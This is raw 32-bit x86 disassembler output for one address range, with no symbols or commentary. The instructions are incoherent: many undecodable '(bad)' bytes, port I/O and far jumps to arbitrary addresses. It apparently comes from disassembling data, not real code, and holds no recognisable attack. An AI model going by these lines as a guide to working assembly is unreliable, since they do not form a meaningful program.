  40f622:	shl    BYTE PTR [ebp+eax*2-0x2bb71049],cl
  40f629:	outs   dx,DWORD PTR ds:[esi]
  40f62a:	fnstsw WORD PTR cs:[ebx+0x30364d01]
  40f631:	add    esi,DWORD PTR [esi]
  40f633:	es (bad) 
  40f635:	add    DWORD PTR [edi-0x7efc2bd7],0x4bb78c12
  40f63f:	jnp    0x40f665
  40f641:	into   
  40f642:	rcl    dh,0xb4
  40f645:	aaa    
  40f646:	addr16 jmp 0x19e4ebb0
  40f64c:	dec    eax
  40f64d:	jecxz  0x40f66c
  40f64f:	loope  0x40f647
  40f651:	push   edi
  40f652:	jne    0x40f672
  40f654:	stc    
  40f655:	(bad)  
  40f656:	aas    
  40f657:	mov    ebp,0xed302dd1
  40f65c:	pop    edx
  40f65d:	sub    al,0xf6
  40f65f:	sbb    DWORD PTR [edx+0x5f9721d8],edx
  40f665:	or     BYTE PTR [esi-0x49d6acfb],0x70
  40f66c:	addr16 das 
  40f66e:	pop    esp
  40f66f:	nop
  40f670:	mov    ecx,0x9242d481
  40f675:	(bad)
  40f678:	lahf   
  40f679:	aam    0xe9
  40f67b:	adc    esp,eax
  40f67d:	stos   BYTE PTR es:[edi],al
  40f67e:	fmul   QWORD PTR [eax+0x61d9a1f0]
  40f684:	retf   
  40f685:	pop    edi
  40f686:	js     0xcad51760
  40f68c:	sub    ecx,eax
  40f68e:	pop    esp
  40f68f:	push   esp
  40f690:	and    eax,0xdad1d729
  40f695:	ret    0x9a41
  40f698:	push   es
  40f699:	call   0x9415:0x261a5395
  40f6a0:	out    0x81,eax
  40f6a2:	clc    
  40f6a3:	inc    edi
  40f6a4:	dec    esi
  40f6a5:	shr    DWORD PTR [ebp-0x3f],1
  40f6a8:	adc    DWORD PTR [ecx],esi
  40f6aa:	shr    DWORD PTR [ebx-0x2eece5dd],0xc9
  40f6b1:	cs mov ecx,0x3ad3c139
  40f6b7:	cmp    DWORD PTR [esi+eax*2-0x39],ebx
  40f6bb:	jbe    0x40f6c4
  40f6bd:	sbb    BYTE PTR ss:[esi+0x13b4e627],dl
  40f6c4:	dec    esi
  40f6c5:	mov    ebx,0xf6403230
  40f6ca:	xor    DWORD PTR [ebp+0x5c],esp
  40f6cd:	scas   al,BYTE PTR es:[edi]
  40f6ce:	test   eax,0x524e6dd0
  40f6d3:	add    eax,0x99272447
  40f6d8:	pop    ebx
  40f6d9:	inc    eax
  40f6da:	xchg   DWORD PTR [esi+0x29],edi
  40f6dd:	iret   
  40f6de:	data16 sbb al,0xd2
  40f6e1:	xchg   esi,eax
  40f6e2:	mov    edx,DWORD PTR [edx]
  40f6e4:	inc    ecx
  40f6e5:	jle    0x40f760
  40f6e7:	outs   dx,DWORD PTR ds:[esi]
  40f6e8:	das    
  40f6e9:	mov    edi,0x61f9a485
  40f6ee:	loopne 0x40f764
  40f6f0:	fisub  DWORD PTR [esi+0x31cf3247]
  40f6f6:	dec    ebx
  40f6f7:	adc    BYTE PTR [ecx],0xca
  40f6fa:	enter  0xab35,0x0
  40f6fe:	das    
  40f6ff:	lahf   
  40f700:	mov    dl,0x68
  40f702:	sub    eax,0x7985b5ca
  40f707:	jmp    0x40f71e
  40f709:	mov    dh,BYTE PTR [esi-0x30b30535]
  40f70f:	je     0x40f6bf
  40f711:	(bad)  
  40f713:	push   cs
  40f714:	jmp    0x5700bed2
  40f719:	push   edx
  40f71a:	or     al,0x6
  40f71c:	inc    eax
  40f71d:	xor    BYTE PTR [edi-0x6e6e5679],ah
  40f723:	mov    ebp,0xbc162c2f
  40f728:	xchg   ecx,eax
  40f729:	jne    0x40f792
  40f72b:	popa   
  40f72c:	inc    esp
  40f72d:	je     0x40f6bd
  40f72f:	cwde   
  40f730:	xor    ecx,ebp
  40f732:	scas   eax,DWORD PTR es:[edi]
  40f733:	jmp    DWORD PTR [eax+ecx*4+0x4017aee3]
  40f73a:	adc    BYTE PTR [ecx+eax*2-0x30],ah
  40f73e:	mov    esi,0x2290260
  40f743:	arpl   WORD PTR [edi-0x32],dx
  40f746:	call   0x9ef3fc05
  40f74b:	pop    ss
  40f74c:	and    eax,0x49a53b9f
  40f751:	test   eax,0xd2faa37
  40f756:	addr16 mov bl,0x84
  40f759:	sub    DWORD PTR [edi+0x5ee3eef7],ebx
  40f75f:	adc    al,0xff
  40f761:	and    BYTE PTR ds:[ebp+0x4f],dl
  40f765:	and    ah,dh
  40f767:	dec    ecx
  40f768:	imul   di,WORD PTR [eax+0xc04c230],0xaaa3
  40f771:	mov    ebp,0xc9d37b68
  40f776:	mov    al,0xaa
  40f778:	sub    ebx,DWORD PTR [ebp-0x1a0573e9]
  40f77e:	mov    ecx,0xa403159f
  40f783:	mov    cl,0x85
  40f785:	lods   eax,DWORD PTR ds:[esi]
  40f786:	cli    
  40f787:	fiadd  DWORD PTR [ebx-0x12441f74]
  40f78d:	pop    ebp
  40f78e:	in     al,dx
  40f78f:	inc    edi
  40f790:	les    esp,FWORD PTR ds:0xc4295fe
  40f796:	pop    ss
  40f797:	or     ch,dh
  40f799:	imul   edx,DWORD PTR [ecx+0x7a],0x7a66ccc6
  40f7a0:	push   edi
  40f7a1:	dec    ebx
  40f7a2:	out    dx,eax
  40f7a3:	outs   dx,BYTE PTR ds:[esi]
  40f7a4:	mov    DWORD PTR [edx+0x6a],ebp
  40f7a7:	push   ebp
  40f7a8:	(bad)  
  40f7aa:	mov    cl,0xf
  40f7ac:	jge    0x40f745
  40f7ae:	ja     0x40f7fb
  40f7b0:	jb     0x40f7a5
  40f7b2:	repnz lahf 
  40f7b4:	and    cl,bh
  40f7b6:	mov    ebx,0xdce0114a
  40f7bb:	sub    ecx,edi
  40f7bd:	jg     0x40f776
  40f7bf:	cli    
  40f7c0:	pop    edx
  40f7c1:	dec    ebp
  40f7c2:	push   esp
  40f7c3:	jecxz  0x40f7b6
  40f7c5:	fstp   DWORD PTR [eax]
  40f7c7:	mov    ds:0x14c8ddf1,eax
  40f7cc:	js     0x40f84b
  40f7ce:	and    DWORD PTR [edx],esi
  40f7d0:	les    edx,FWORD PTR [edi+ecx*1-0x56]
  40f7d4:	pop    eax
  40f7d5:	mov    al,0xb3
  40f7d7:	xchg   esp,eax
  40f7d8:	pushf  
  40f7d9:	sbb    edx,DWORD PTR [ebx+0x48469ae8]
  40f7df:	enter  0x2d32,0x3e
  40f7e3:	pusha  
  40f7e4:	repz mov edi,0xac4462d3
  40f7ea:	repnz pop ds
  40f7ec:	out    0xea,eax
  40f7ee:	div    ah
  40f7f0:	jle    0x40f7bf
  40f7f2:	push   edi
  40f7f3:	arpl   sp,si
  40f7f5:	mov    eax,0x256e1c3a
  40f7fa:	adc    DWORD PTR [edx+0x67],0xffffffc4
  40f7fe:	cdq    
  40f7ff:	(bad)  
  40f800:	xchg   esp,eax
  40f801:	dec    ebp
  40f802:	pop    ebp
  40f803:	(bad)  
  40f805:	add    DWORD PTR [edx-0xd34545d],edi
  40f80b:	aas    
  40f80c:	add    eax,0x927805ea
  40f811:	add    ch,BYTE PTR [eax-0x7b]
  40f814:	jp     0x40f88c
  40f816:	adc    DWORD PTR [esi+0x335f512],esi
  40f81c:	jns    0x40f812
  40f81e:	sbb    al,0x65
  40f820:	and    al,0xf3
  40f822:	hlt    
  40f823:	push   eax
  40f824:	xchg   ecx,eax
  40f825:	sti    
  40f826:	popa   
  40f827:	ror    DWORD PTR [edx-0x7f13955a],0x7d
  40f82e:	add    ch,ch
  40f830:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f831:	jnp    0x40f7b5
  40f833:	ins    DWORD PTR es:[edi],dx
  40f834:	mov    cl,BYTE PTR [esi+ecx*4-0x4c]
  40f838:	retf   0xd93c
  40f83b:	sbb    bh,BYTE PTR [edi+0x7c]
  40f83e:	xchg   ebp,eax
  40f83f:	mov    ds:0xe9394086,eax
  40f844:	push   eax
  40f845:	call   0xac44e2b0
  40f84a:	jno    0x40f7df
  40f84c:	push   0x8940b02c
  40f851:	sbb    eax,0xf683a145
  40f856:	xchg   esi,eax
  40f857:	add    DWORD PTR [ebp-0x41db5175],esi
  40f85d:	jo     0x40f894
  40f85f:	push   ecx
  40f860:	cwde   
  40f861:	mov    ebp,0x5de1bc87
  40f866:	jne    0x40f843
  40f868:	mov    dh,0x54
  40f86a:	lods   eax,DWORD PTR ds:[esi]
  40f86b:	adc    edx,edx
  40f86d:	jmp    0x40f843
  40f86f:	mov    ah,BYTE PTR [esi+0x5fc50994]
  40f875:	daa    
  40f876:	pushf  
  40f877:	sub    al,0xdc
  40f879:	cmp    eax,0xac021f2
  40f87e:	mov    esi,0xe1b821d1
  40f883:	out    0xd7,eax
  40f885:	in     al,dx
  40f886:	add    eax,0x5dcf0624
  40f88b:	pushf  
  40f88c:	fcomp  QWORD PTR [ecx+0x34912651]
  40f892:	pusha  
  40f893:	std    
  40f894:	out    dx,al
  40f895:	xor    cl,BYTE PTR [ebp+ebp*2-0x68]
  40f899:	mov    ds:0x9bdd6e72,al
  40f89e:	ds push cs
  40f8a0:	outs   dx,DWORD PTR ds:[esi]
  40f8a1:	add    ch,BYTE PTR [ebp+0x2a]
  40f8a4:	in     al,dx
  40f8a5:	icebp  
  40f8a6:	jnp    0x40f8e2
  40f8a8:	or     BYTE PTR [esi],ch
  40f8aa:	cmp    BYTE PTR [edx-0x4d],dh
  40f8ad:	push   ebx
  40f8ae:	mov    bh,0xe2
  40f8b0:	loop   0x40f83d
  40f8b2:	test   al,0x31
  40f8b4:	int3   
  40f8b5:	cli    
  40f8b6:	mov    ch,0x79
  40f8b8:	xor    al,BYTE PTR [ebx]
  40f8ba:	leave  
  40f8bb:	mov    ecx,0x53ca122d
  40f8c0:	jmp    0x314e242d
  40f8c5:	adc    BYTE PTR [edi+0x4edfeace],bh
  40f8cb:	xchg   BYTE PTR ds:[edx],bh
  40f8ce:	mov    DWORD PTR [esi+0x3b6f943a],ebx
  40f8d4:	inc    edi
  40f8d5:	jecxz  0x40f85c
  40f8d7:	das    
  40f8d8:	mov    ds:0xd0a30cc5,eax
  40f8dd:	cli    
  40f8de:	adc    bx,WORD PTR [ecx+0x1b5edbd9]
  40f8e5:	in     al,dx
  40f8e6:	jge    0x40f86e
  40f8e8:	mov    DWORD PTR [eax],ebx
  40f8ea:	sahf   
  40f8eb:	xchg   ebx,eax
  40f8ec:	out    0xf5,al
  40f8ee:	add    al,0x86
  40f8f0:	mov    cl,0x3f
  40f8f2:	pop    edi
  40f8f3:	mov    esp,0x7dcfc392
  40f8f8:	nop
  40f8f9:	cmp    DWORD PTR [ebx],esp
  40f8fb:	je     0x40f97b
  40f8fd:	push   ebp
  40f8fe:	mov    dh,0xa0
  40f900:	popf   
  40f901:	dec    esp
  40f902:	add    esp,ebx
  40f904:	imul   edx,eax,0xbfdd7531
  40f90a:	push   ebx
  40f90b:	ins    BYTE PTR es:[edi],dx
  40f90c:	jne    0x40f89e
  40f90e:	mov    BYTE PTR [ebp+0x24],bh
  40f911:	rcr    BYTE PTR [ecx-0x7b],cl
  40f914:	adc    eax,0xd942e47f
  40f919:	aad    0xe7
  40f91b:	in     al,dx
  40f91c:	mov    edi,0x8c7e4099
  40f921:	pushf  
  40f922:	shr    bl,cl
  40f924:	push   ebp
  40f925:	imul   edx,DWORD PTR [ebx+0x2b],0xd0fdb71d
  40f92c:	mov    ds:0xde34d8c6,eax
  40f931:	mov    al,0x85
  40f933:	sbb    BYTE PTR [esi],dh
  40f935:	fimul  WORD PTR [ecx-0x57]
  40f938:	mov    esp,0x244a28ef
  40f93d:	(bad)  
  40f93e:	dec    ebx
  40f93f:	popa   
  40f940:	out    dx,al
  40f941:	pop    esi
  40f942:	mov    BYTE PTR [esi-0x15],0xf
  40f946:	push   ecx
  40f947:	add    bh,bh
  40f949:	fnsave [edi+0x55]
  40f94c:	add    al,0xd
  40f94e:	lods   al,BYTE PTR ds:[esi]
  40f94f:	ret    0x188
  40f952:	push   esi
  40f953:	sbb    al,0xfc
  40f955:	int3   
  40f956:	mov    DWORD PTR [eax],ebp
  40f958:	mov    esi,DWORD PTR [ebx-0x589d5473]
  40f95e:	xchg   BYTE PTR [edi+edi*2+0x41],dh
  40f962:	ins    BYTE PTR es:[edi],dx
  40f963:	mov    ch,0x50
  40f965:	sahf   
  40f966:	(bad)  
  40f967:	mov    BYTE PTR [edi],0x6c
  40f96a:	test   BYTE PTR [eax+edx*4],bl
  40f96d:	adc    eax,0xf69ebc48
  40f972:	aas    
  40f973:	pushf  
  40f974:	test   BYTE PTR [ebx],ah
  40f976:	aas    
  40f977:	mov    bh,0x48
  40f979:	sahf   
  40f97a:	mov    dl,0x83
  40f97c:	arpl   WORD PTR [esi+eax*2+0x1c],ax
  40f980:	pop    es
  40f981:	cs mov cl,0x8d
  40f984:	lock inc ebp
  40f986:	jg     0x40f90d
  40f988:	cmp    eax,0xee19d1ee
  40f98d:	(bad)  
  40f98e:	jmp    0x40f9b6
  40f990:	adc    edx,DWORD PTR [edx+eax*1]
  40f993:	cmp    BYTE PTR [esi-0x33],dl
  40f996:	dec    ebp
  40f997:	mov    edi,0x2c054d57
  40f99c:	loope  0x40fa0f
  40f99e:	lds    esp,FWORD PTR [edi-0x7d4addf7]
  40f9a4:	pop    ecx
  40f9a5:	int    0xdd
  40f9a7:	xchg   esi,eax
  40f9a8:	inc    esp
  40f9a9:	jg     0x40f9a3
  40f9ab:	mov    ebp,ds
  40f9ad:	mov    cl,0x9a
  40f9af:	(bad)  
  40f9b0:	sahf   
  40f9b1:	mov    eax,ds:0xbed5a553
  40f9b7:	rol    DWORD PTR [edx+0x2e72f872],cl
  40f9bd:	xchg   ecx,eax
  40f9be:	shr    DWORD PTR [ecx-0x612e68b7],0xf7
  40f9c5:	cmp    bl,al
  40f9c7:	mov    ecx,0xc3d64ec5
  40f9cc:	mov    bl,0x72
  40f9ce:	sbb    DWORD PTR [esi],edx
  40f9d0:	xchg   ecx,eax
  40f9d1:	adc    BYTE PTR [esi+0x1cfef98b],bh
  40f9d7:	or     edx,DWORD PTR [ecx+0x282b13ea]
  40f9dd:	daa    
  40f9de:	inc    esi
  40f9df:	enter  0xdc67,0xa9
  40f9e3:	lds    esp,FWORD PTR [edi]
  40f9e5:	add    eax,0x7ff6bafa
  40f9ea:	lahf   
  40f9eb:	lahf   
  40f9ec:	mov    edi,0xe74c20bd
  40f9f1:	push   0x15
  40f9f3:	sbb    DWORD PTR [edx+0x5],0xe6faba77
  40f9fa:	icebp  
  40f9fb:	lds    esp,FWORD PTR [ebp+0x7d]
  40f9fe:	(bad)  
  40fa00:	and    BYTE PTR [ebp-0x74],dl
  40fa03:	dec    ebx
  40fa04:	lods   al,BYTE PTR ds:[esi]
  40fa05:	scas   eax,DWORD PTR es:[edi]
  40fa06:	into   
  40fa07:	scas   eax,DWORD PTR es:[edi]
  40fa08:	sar    DWORD PTR [esi+0x26],1
  40fa0b:	outs   dx,BYTE PTR ds:[esi]
  40fa0c:	adc    eax,ebx
  40fa0e:	outs   dx,DWORD PTR ds:[esi]
  40fa0f:	into   
  40fa10:	pop    ecx
  40fa11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa12:	pop    esp
  40fa13:	sbb    BYTE PTR [esi-0x44934986],dh
  40fa19:	cs add eax,0xb8645105
  40fa1f:	mov    edx,0xa498990
  40fa24:	add    ah,ch
  40fa26:	and    edx,esp
  40fa28:	xor    al,0x6c
  40fa2a:	sbb    bl,BYTE PTR [edi-0x7a75ed1c]
  40fa30:	popa   
  40fa31:	push   ds
  40fa32:	scas   eax,DWORD PTR es:[edi]
  40fa33:	pop    ebx
  40fa34:	dec    ecx
  40fa35:	inc    DWORD PTR [eax-0x2257612]
  40fa3b:	jmp    0x7d14b733
  40fa40:	sub    BYTE PTR [ecx],0x7f
  40fa43:	das    
  40fa44:	mov    cl,0x95
  40fa46:	cmp    DWORD PTR [ecx+0x0],ebx
  40fa49:	loope  0x40faa7
  40fa4b:	sbb    dh,BYTE PTR [eax-0x26086970]
  40fa51:	cmc    
  40fa52:	das    
  40fa53:	or     eax,DWORD PTR [edx]
  40fa55:	mov    esp,DWORD PTR [ebx-0x15cff1b5]
  40fa5b:	mov    edx,0xfad87154
  40fa60:	xchg   esi,eax
  40fa61:	imul   ecx,edi,0xaf6d9a3b
  40fa67:	xchg   edi,eax
  40fa68:	cmp    al,0xce
  40fa6a:	sahf   
  40fa6b:	js     0x40fae2
  40fa6d:	xchg   BYTE PTR ds:0x6058cdc9,ah
  40fa73:	fdivr  DWORD PTR [eax+0x4fcb2d0b]
  40fa79:	sub    eax,0x2449be43
  40fa7e:	pop    ebp
  40fa7f:	push   0x3fcdc71b
  40fa84:	or     eax,0xfcecdb82
  40fa89:	in     eax,dx
  40fa8a:	jno    0x40fa8f
  40fa8c:	cmp    DWORD PTR [edi],esi
  40fa8e:	cmp    al,0x9c
  40fa90:	mov    ebx,0xc2249099
  40fa95:	xchg   esp,eax
  40fa96:	(bad)  
  40fa97:	mov    cl,0xc5
  40fa99:	std    
  40fa9a:	stc    
  40fa9b:	popf   
  40fa9c:	dec    edx
  40fa9d:	and    esp,esi
  40fa9f:	pop    es
  40faa0:	call   0xe364febb
  40faa5:	loopne 0x40facb
  40faa7:	cmp    BYTE PTR [eax+eiz*8-0x22455747],bl
  40faae:	sbb    BYTE PTR [ecx+0x15da1e51],dl
  40fab4:	dec    esi
  40fab5:	mov    edx,0xb1c61fb8
  40faba:	mov    DWORD PTR [eax+ecx*4+0x1508314c],ebx
  40fac1:	dec    ecx
  40fac2:	loop   0x40fac2
  40fac4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fac5:	xlat   BYTE PTR ds:[ebx]
  40fac6:	cmp    ebp,DWORD PTR ds:0xfd6b38c4
  40facc:	jns    0x40fb08
  40face:	cwde   
  40facf:	ret    
  40fad0:	or     ch,bl
  40fad2:	out    dx,eax
  40fad3:	xor    BYTE PTR [esi],ah
  40fad5:	mov    ds:0x63776914,al
  40fada:	pop    edi
  40fadb:	rcr    BYTE PTR [esi+0x74d74a5f],0xc8
  40fae2:	jne    0x40fae6
  40fae4:	jbe    0x40fb3b
  40fae6:	rcr    BYTE PTR [edx],1
  40fae8:	outs   dx,DWORD PTR ds:[esi]
  40fae9:	push   esi
  40faea:	mov    WORD PTR [esi+0x4a0ec31d],gs
  40faf0:	fisub  WORD PTR [eax]
  40faf2:	sbb    DWORD PTR [ebp-0x79a84b2d],ebp
  40faf8:	adc    dl,ch
  40fafa:	dec    edi
  40fafb:	xchg   ebp,eax
  40fafc:	scas   eax,DWORD PTR es:[edi]
  40fafd:	stos   DWORD PTR es:[edi],eax
  40fafe:	rcr    DWORD PTR fs:[edx-0x5103f655],cl
  40fb05:	in     al,dx
  40fb06:	jg     0x40fb6e
  40fb08:	(bad)  
  40fb09:	pop    esp
  40fb0a:	rcl    BYTE PTR [edx+0x52],1
  40fb0d:	(bad)  
  40fb0e:	(bad)  
  40fb0f:	cld    
  40fb10:	and    BYTE PTR [edi+edi*8-0x4c],al
  40fb14:	sub    DWORD PTR [eax+0x43],eax
  40fb17:	neg    esp
  40fb19:	shl    BYTE PTR [ecx-0x379a4cc5],1
  40fb1f:	and    BYTE PTR [ecx-0x344bb9e4],cl
  40fb25:	jl     0x40fb17
  40fb27:	sbb    eax,0xe0d16a10
  40fb2c:	inc    edi
  40fb2d:	iret   
  40fb2e:	inc    eax
  40fb2f:	ins    DWORD PTR es:[edi],dx
  40fb30:	fbstp  TBYTE PTR [esi]
  40fb32:	fld    QWORD PTR ss:[ebp+0x38316cce]
  40fb39:	xor    eax,0xe6d72fe0
  40fb3e:	dec    edi
  40fb3f:	jmp    0xcbb0:0x6aee162f
  40fb46:	push   ecx
  40fb47:	dec    esi
  40fb48:	cmp    eax,DWORD PTR [esp+edi*1]
  40fb4b:	repnz adc BYTE PTR [eax+0x6f0c2af8],0x60
  40fb53:	or     BYTE PTR [edi],bl
  40fb55:	mov    DWORD PTR [esi+0x33],ebx
  40fb58:	jecxz  0x40fb4f
  40fb5a:	ror    DWORD PTR [eax],cl
  40fb5c:	sbb    DWORD PTR [esi],ebx
  40fb5e:	aam    0x4c
  40fb60:	ja     0x40fb2b
  40fb62:	mov    dl,0xc3
  40fb64:	sar    DWORD PTR [eax],1
  40fb66:	in     eax,dx
  40fb67:	stc    
  40fb68:	test   BYTE PTR [esi+0x28],0x95
  40fb6c:	inc    ebp
  40fb6d:	cmp    al,0xbc
  40fb6f:	jl     0x40faf4
  40fb71:	mov    dl,0x51
  40fb73:	lds    esp,FWORD PTR [ebp-0x58535122]
  40fb79:	sbb    ah,0x3c
  40fb7c:	lock push ecx
  40fb7e:	pop    edx
  40fb7f:	jae    0x40fbee
  40fb81:	pop    eax
  40fb82:	cwde   
  40fb83:	dec    edx
  40fb84:	popf   
  40fb85:	ins    BYTE PTR es:[edi],dx
  40fb86:	inc    ebp
  40fb87:	in     eax,0x22
  40fb89:	nop
  40fb8a:	mov    ch,BYTE PTR [esi+0x178c216b]
  40fb90:	call   0x309b03a8
  40fb95:	cmp    eax,0x3c3c8dfe
  40fb9a:	mov    ds:0x2620f313,eax
  40fb9f:	add    DWORD PTR [eax-0x744b2838],ecx
  40fba5:	mov    al,BYTE PTR [ecx-0x20a7e05a]
  40fbab:	dec    edi
  40fbac:	loopne 0x40fbae
  40fbae:	int3   
  40fbaf:	or     BYTE PTR [esp+esi*4],0x23
  40fbb3:	test   BYTE PTR ss:[edi+0x11463dee],bh
  40fbba:	jp     0x40fbca
  40fbbc:	sar    edx,1
  40fbbe:	(bad)  
  40fbbf:	(bad)  
  40fbc0:	jns    0x40fbf8
  40fbc2:	ins    DWORD PTR es:[edi],dx
  40fbc3:	stos   DWORD PTR es:[edi],eax
  40fbc4:	mov    ch,0xab
  40fbc6:	push   es
  40fbc7:	arpl   WORD PTR [ebp-0x35],dx
  40fbca:	stos   BYTE PTR es:[edi],al
  40fbcb:	mov    dh,0x23
  40fbcd:	xchg   ch,ah
  40fbcf:	mov    eax,ds:0xc482d141
  40fbd4:	mov    cl,0x75
  40fbd6:	mov    es,ebp
  40fbd8:	xor    al,0x7a
  40fbda:	xor    ch,BYTE PTR [esi]
  40fbdc:	shl    BYTE PTR [esi],0xdb
  40fbdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbe0:	dec    ecx
  40fbe1:	or     ecx,ebp
  40fbe3:	and    eax,0x1cc02d8d
  40fbe8:	aaa    
  40fbe9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fbea:	mov    ds:0x5dc5283f,eax
  40fbef:	mov    bh,0xde
  40fbf1:	addr16 data16 mov bh,0x96
  40fbf5:	ss js  0x40fb7d
  40fbf8:	int3   
  40fbf9:	sbb    al,0xef
  40fbfb:	push   cs
  40fbfc:	pushf  
  40fbfd:	cmp    dh,cl
  40fbff:	addr16 fmul st,st(5)
  40fc02:	stc    
  40fc03:	mov    ecx,esi
  40fc05:	xchg   ebx,eax
  40fc06:	imul   ecx,DWORD PTR [edi-0x21],0x6ba28d63
  40fc0d:	push   eax
  40fc0e:	cmp    DWORD PTR [esi+0xd9a0eb7],ebp
  40fc14:	xor    DWORD PTR [ebx],esi
  40fc16:	cs push cs
  40fc18:	add    bl,BYTE PTR [ecx-0x30]
  40fc1b:	out    dx,al
  40fc1c:	push   ss
  40fc1d:	pop    es
  40fc1e:	test   al,0x14
  40fc20:	push   ecx
  40fc21:	or     edi,DWORD PTR [ebp+0x7a86cbe6]
  40fc27:	lods   eax,DWORD PTR ds:[esi]
  40fc28:	pop    edi
  40fc29:	or     al,0x3e
  40fc2b:	sahf   
  40fc2c:	adc    bl,BYTE PTR [ecx]
  40fc2e:	cmp    bl,BYTE PTR [ebx]
  40fc30:	sub    edi,DWORD PTR [eax]
  40fc32:	scas   al,BYTE PTR es:[edi]
  40fc33:	or     bl,ch
  40fc35:	leave  
  40fc36:	push   ds
  40fc37:	out    dx,al
  40fc38:	push   0xffffffd4
  40fc3a:	int3   
  40fc3b:	gs pop es
  40fc3d:	and    ah,BYTE PTR [ecx+0x441c6d39]
  40fc43:	adc    ebx,edx
  40fc45:	(bad)  
  40fc46:	mov    eax,0x79017b46
  40fc4b:	aad    0x93
  40fc4d:	rcr    BYTE PTR [esi-0x6d],cl
  40fc50:	cmp    edi,DWORD PTR [eax]
  40fc52:	cli    
  40fc53:	mov    dl,0x82
  40fc55:	cmp    eax,DWORD PTR [eax]
  40fc57:	out    dx,al
  40fc58:	push   ss
  40fc59:	stc    
  40fc5a:	inc    ebp
  40fc5b:	test   BYTE PTR [edi+0x4d],al
  40fc5e:	addr16 xor al,ch
  40fc61:	(bad)  
  40fc62:	mov    edi,0x9d2fc968
  40fc68:	imul   ebp,DWORD PTR [ebx+0x2d],0xffffff82
  40fc6c:	and    DWORD PTR [edx+0x4e34a62],ecx
  40fc72:	fisttp WORD PTR [edi+eiz*1+0x56]
  40fc76:	push   cs
  40fc77:	mov    eax,ds:0xb6b94fcd
  40fc7c:	ins    WORD PTR es:[edi],dx
  40fc7e:	cmp    eax,0xe59ab1d3
  40fc83:	call   0x84f4:0x5d881fd4
  40fc8a:	adc    al,0x8a
  40fc8c:	sbb    DWORD PTR [esp+esi*4],esi
  40fc8f:	leave  
  40fc90:	mov    dh,0x60
  40fc92:	xchg   edx,eax
  40fc93:	or     edx,DWORD PTR [ebx+0x2c]
  40fc96:	leave  
  40fc97:	xchg   ebp,eax
  40fc98:	mov    es,eax
  40fc9a:	repz add eax,0xf0ea3282
  40fca0:	jb     0x40fd0d
  40fca2:	mov    ebx,0xfc828436
  40fca7:	mov    eax,ds:0x13156b99
  40fcac:	push   es
  40fcad:	mov    dl,BYTE PTR [edi]
  40fcaf:	call   0x2ca60a00
  40fcb4:	shl    BYTE PTR [ebp-0x7038d712],1
  40fcba:	retf   
  40fcbb:	push   0x14
  40fcbd:	or     al,0xd4
  40fcbf:	or     DWORD PTR [eax],edi
  40fcc1:	mov    dl,0xfe
  40fcc3:	adc    eax,0xb5db769a
  40fcc8:	mov    edx,0xbf977149
  40fccd:	out    0xd,al
  40fccf:	mov    al,ds:0x2ca63aff
  40fcd4:	inc    edi
  40fcd5:	inc    ebx
  40fcd6:	lods   al,BYTE PTR ds:[esi]
  40fcd7:	xchg   esi,eax
  40fcd8:	adc    eax,0x4622b4a1
  40fcdd:	add    eax,DWORD PTR [eax]
  40fcdf:	mov    eax,ds:0xd8f92c28
  40fce4:	add    DWORD PTR [ecx+ebp*2-0x60b2114f],ebx
  40fceb:	add    eax,0x2b2de637
  40fcf0:	ja     0x40fc8a
  40fcf2:	sbb    ebp,DWORD PTR [edi+ecx*4+0x28b1daf4]
  40fcf9:	bound  edi,QWORD PTR [ecx+0x8844ef2]
  40fcff:	(bad)  
  40fd00:	in     al,dx
  40fd01:	jmp    0x40fcbf
  40fd03:	daa    
  40fd04:	scas   eax,DWORD PTR es:[edi]
  40fd05:	inc    ebx
  40fd06:	(bad)  
  40fd07:	test   esp,0xf2c201c9
  40fd0d:	loop   0x40fd00
  40fd0f:	sbb    eax,0x76126baa
  40fd14:	xchg   esi,eax
  40fd15:	and    dl,dh
  40fd17:	pop    ecx
  40fd18:	adc    eax,0x23b8be84
  40fd1d:	cmp    ebx,ebx
  40fd1f:	inc    ecx
  40fd20:	lds    eax,FWORD PTR [esp+ebx*8+0x58]
  40fd24:	xchg   dl,ah
  40fd26:	inc    edi
  40fd27:	shr    BYTE PTR [ebx-0x2d],cl
  40fd2a:	mov    WORD PTR [ebp+0x7368aeb7],?
  40fd30:	shl    BYTE PTR [edi+eiz*4],1
  40fd33:	fcomp  DWORD PTR [eax]
  40fd35:	and    al,0x73
  40fd37:	in     eax,0x2b
  40fd39:	inc    BYTE PTR [edx-0x6b68576c]
  40fd3f:	dec    eax
  40fd40:	in     eax,dx
  40fd41:	jmp    0x40fd46
  40fd43:	repz sbb al,0x20
  40fd46:	push   ebp
  40fd47:	rcr    DWORD PTR [ecx+ebp*2-0x35],cl
  40fd4b:	repnz and bl,BYTE PTR [ecx-0x7359b981]
  40fd52:	jo     0x40fd7e
  40fd54:	lahf   
  40fd55:	jecxz  0x40fd27
  40fd57:	loop   0x40fd6c
  40fd59:	outs   dx,DWORD PTR ds:[esi]
  40fd5a:	pop    ebp
  40fd5b:	mov    WORD PTR [eax+0x6f077c11],?
  40fd61:	test   al,0x35
  40fd63:	inc    ecx
  40fd64:	jecxz  0x40fcf0
  40fd66:	cld    
  40fd67:	push   ebp
  40fd68:	stos   BYTE PTR es:[edi],al
  40fd69:	sub    edi,edx
  40fd6b:	and    BYTE PTR [ecx+0x53146c32],0x59
  40fd72:	xor    esp,DWORD PTR [ecx]
  40fd74:	sub    eax,DWORD PTR [ebp+0x7]
  40fd77:	cld    
  40fd78:	mov    edi,0xd828ebca
  40fd7d:	sahf   
  40fd7e:	inc    edi
  40fd7f:	cmc    
  40fd80:	popf   
  40fd81:	cs ins DWORD PTR es:[edi],dx
  40fd83:	btc    DWORD PTR [ecx+edi*8+0x30b1a74d],0xb2
  40fd8c:	or     eax,DWORD PTR [ecx-0x7473ea87]
  40fd92:	into   
  40fd93:	call   0x9666b5d2
  40fd98:	mov    edx,0xe93aec67
  40fd9d:	xor    ch,BYTE PTR [edx-0x7766f181]
  40fda3:	popf   
  40fda4:	mov    edi,0xf553d5e0
  40fda9:	xchg   esp,eax
  40fdaa:	xchg   esp,eax
  40fdab:	or     dh,BYTE PTR [edx+0x15]
  40fdae:	xchg   BYTE PTR [edi-0x608601a4],ch
  40fdb4:	test   BYTE PTR [eax],ch
  40fdb6:	daa    
  40fdb7:	jge    0x40fdec
  40fdb9:	sbb    ebx,DWORD PTR [ecx+0x35]
